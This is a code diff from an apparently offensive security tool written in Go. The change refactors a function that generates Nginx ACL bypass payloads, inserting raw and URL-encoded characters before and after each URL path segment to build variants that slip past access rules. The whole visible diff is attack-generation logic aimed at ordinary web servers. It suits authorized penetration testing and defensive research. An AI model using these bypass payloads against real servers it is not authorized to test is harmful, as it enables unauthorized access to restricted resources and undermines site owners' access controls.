@@ -872,26 +872,45 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 		addJob("/" + encoded + strings.TrimPrefix(basePath, "/") + query)
 	}
 
-	// 4. Insert characters between path segments
+	// 4a. Insert characters immediately AFTER each path segment (except the last)
+	// Generates patterns like /segment1<char>/segment2...
 	if len(pathSegments) > 1 {
-		for i := 0; i < len(pathSegments); i++ {
-			prefix := "/" + strings.Join(pathSegments[:i], "/")
-			if i > 0 {
-				prefix += "/" // Add trailing slash for segments after first
-			}
+		for i := 0; i < len(pathSegments)-1; i++ { // Iterate up to the second-to-last segment
+			// Join segments up to and including i
+			prefix := "/" + strings.Join(pathSegments[:i+1], "/")
+			// Join segments after i, adding a leading slash
+			suffix := "/" + strings.Join(pathSegments[i+1:], "/")
 
-			suffix := ""
-			if i < len(pathSegments) {
-				suffix = "/" + strings.Join(pathSegments[i:], "/")
-			}
-
-			// Raw characters
 			for _, char := range rawBypassChars {
 				addJob(prefix + char + suffix + query)
 			}
-			// URL-encoded characters
 			for _, encoded := range encodedBypassChars {
 				addJob(prefix + encoded + suffix + query)
+			}
+		}
+	}
+
+	// 4b. Insert characters immediately BEFORE each path segment (except the first)
+	// Generates patterns like /segment1/<char>segment2...
+	if len(pathSegments) > 1 {
+		for i := 1; i < len(pathSegments); i++ { // Iterate starting from the second segment
+			// Join segments before i, adding a leading slash
+			prefix := "/" + strings.Join(pathSegments[:i], "/")
+			// Get the current segment
+			currentSegment := pathSegments[i]
+			// Get the rest of the path segments after the current one
+			restOfPath := ""
+			if i < len(pathSegments)-1 {
+				restOfPath = "/" + strings.Join(pathSegments[i+1:], "/")
+			}
+
+			for _, char := range rawBypassChars {
+				// Combine: prefix + slash + char + currentSegment + restOfPath
+				addJob(prefix + "/" + char + currentSegment + restOfPath + query)
+			}
+			for _, encoded := range encodedBypassChars {
+				// Combine: prefix + slash + encoded_char + currentSegment + restOfPath
+				addJob(prefix + "/" + encoded + currentSegment + restOfPath + query)
 			}
 		}
 	}
